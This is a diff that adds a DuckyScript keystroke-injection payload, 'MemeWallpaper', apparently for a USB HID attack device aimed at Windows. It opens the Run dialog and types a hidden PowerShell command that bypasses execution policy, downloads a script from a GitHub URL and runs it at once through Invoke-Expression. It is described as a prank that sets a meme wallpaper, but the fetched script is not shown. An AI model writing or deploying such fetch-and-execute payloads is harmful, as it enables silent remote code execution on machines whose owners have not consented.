@@ -1,0 +1,10 @@
+REM Title: MemeWallpaper
+REM Author: dsymbol
+REM Description: Hidden PowerShell Script that changes user background to a meme
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/dsymbol/ducky-payloads/main/MemeWallpaper/mw.ps1 | iex
+ENTER
